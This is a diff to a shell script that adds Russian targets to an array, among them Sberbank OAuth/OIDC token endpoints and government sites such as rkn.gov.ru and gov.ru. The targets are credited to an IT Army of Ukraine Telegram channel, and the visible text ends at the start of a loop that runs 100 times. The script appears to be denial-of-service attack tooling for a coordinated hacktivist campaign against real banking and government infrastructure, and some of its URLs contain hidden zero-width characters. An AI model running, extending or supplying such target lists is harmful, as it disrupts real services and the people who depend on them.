@@ -2,6 +2,8 @@
 
 # Best update targets from https://t.me/itarmyofukraine2022
 fuck_these=(
+    "https://api.sberbank.ru/prod/tokens/v2​/oauth"
+    "​https://api.sberbank.ru/prod/tokens/v2​/oidc"
     "https://api.developer.sber.ru/product/SberbankID"
     "https://mail.rkn.gov.ru/" 
     "https://cloud.rkn.gov.ru" 
@@ -41,6 +43,13 @@ fuck_these=(
     "https://pfr.gov.ru/"
     "https://gov.ru/"
     "https://rkn.gov.ru/"
+)
+
+# Latest coordinated list, comment or remove these lines for long-running task
+fuck_these=(
+    "https://api.sberbank.ru/prod/tokens/v2​/oauth"
+    "​https://api.sberbank.ru/prod/tokens/v2​/oidc"
+    "https://api.developer.sber.ru/product/SberbankID"
 )
 
 for n in {1..100}; do 
